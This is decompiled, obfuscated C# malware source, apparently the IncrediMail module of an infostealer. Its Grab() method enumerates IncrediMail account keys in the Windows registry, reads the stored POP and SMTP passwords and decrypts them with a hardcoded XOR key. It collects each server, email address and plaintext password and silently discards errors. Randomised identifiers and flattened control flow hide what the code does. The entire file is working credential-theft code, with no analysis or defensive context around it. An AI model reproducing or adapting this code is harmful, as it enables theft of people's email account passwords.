using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.Win32;
using p3N5Y;

namespace ZAZUx;

public class wb3 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string GiZCJg
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public wb3()
	{
		GiZCJg = "IncrediMail";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string[] array = default;
		string[] array2 = default;
		string text = default;
		List<ii68> list = default;
		byte[] xwws = default;
		do
		{
			if (num == 4)
			{
				array[1] = "SmtpPassword";
				num = 5;
			}
			if (num == 5)
			{
				array2 = array;
				num = 6;
			}
			if (num == 2)
			{
				array = new string[2];
				num = 3;
			}
			if (num == 7)
			{
				text = null;
				num = 8;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 6)
			{
				xwws = new byte[4] { 185, 2, 250, 1 };
				num = 7;
			}
			if (num == 3)
			{
				array[0] = "PopPassword";
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 8);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\IncrediMail\\Identities\\");
			if (registryKey != null)
			{
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string text2 in subKeyNames)
				{
					using RegistryKey registryKey2 = registryKey.OpenSubKey(text2 + "\\Accounts_New");
					string[] subKeyNames2 = registryKey2.GetSubKeyNames();
					foreach (string name in subKeyNames2)
					{
						using RegistryKey registryKey3 = registryKey2.OpenSubKey(name);
						if (!((registryKey3.GetValue("PopPassword") != null) | (registryKey3.GetValue("SmtpPassword") != null)))
						{
							continue;
						}
						string[] array3 = array2;
						foreach (string name2 in array3)
						{
							if (registryKey3.GetValue(name2) != null)
							{
								byte[] array4 = (byte[])registryKey3.GetValue(name2);
								if (array4.Length > 1)
								{
									text = Encoding.UTF8.GetString(yTmU(array4, xwws));
								}
							}
						}
						list.Add(new ii68
						{
							byIdLuuGZbL = ((string)registryKey3.GetValue("SmtpServer")).TrimEnd(new char[1] { Convert.ToChar(0) }),
							S8v = ((string)registryKey3.GetValue("EmailAddress")).TrimEnd(new char[1] { Convert.ToChar(0) }),
							_9H5rP7hg2 = text.TrimEnd(new char[1] { Convert.ToChar(0) }),
							oVAe = GiZCJg
						});
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	private static byte[] yTmU(byte[] JfBVmZ, byte[] Xwws3)
	{
		int num = 0;
		int num2 = default;
		byte[] array = default;
		do
		{
			if (num == 5)
			{
				num2++;
				num = 6;
			}
			if (num == 2)
			{
				num2 = 0;
				num = 3;
			}
			if (num == 3)
			{
				goto IL_00cb;
			}
			if (num == 4)
			{
				goto IL_0089;
			}
			goto IL_00ba;
			IL_00ba:
			if (num == 6)
			{
				goto IL_00cb;
			}
			goto IL_00e9;
			IL_0089:
			array[num2] = Convert.ToByte(JfBVmZ[num2] ^ Xwws3[num2 % Xwws3.Length]);
			num = 5;
			goto IL_00ba;
			IL_00e9:
			if (num == 1)
			{
				array = new byte[JfBVmZ.Length - 1 + 1];
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_00cb:
			if (num2 <= JfBVmZ.Length - 1)
			{
				goto IL_0089;
			}
			num = 7;
			goto IL_00e9;
		}
		while (num != 7);
		return array;
	}
}
